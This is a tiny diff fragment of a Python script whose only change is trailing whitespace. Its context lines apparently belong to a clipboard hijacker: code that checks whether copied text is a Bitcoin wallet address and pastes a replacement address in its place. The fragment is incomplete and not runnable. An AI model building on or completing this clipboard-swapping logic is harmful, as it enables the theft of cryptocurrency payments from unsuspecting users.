@@ -33,7 +33,7 @@ if __name__ == "__main__":
                 ClipboardController().paste_new_data(wallet_to_check)
             else:
                 print("Damn, it's not btc yet")
-        else:
+        else: 
             exit()
 
     # FIXME EVERYTHING ABOVE ===========================================================================
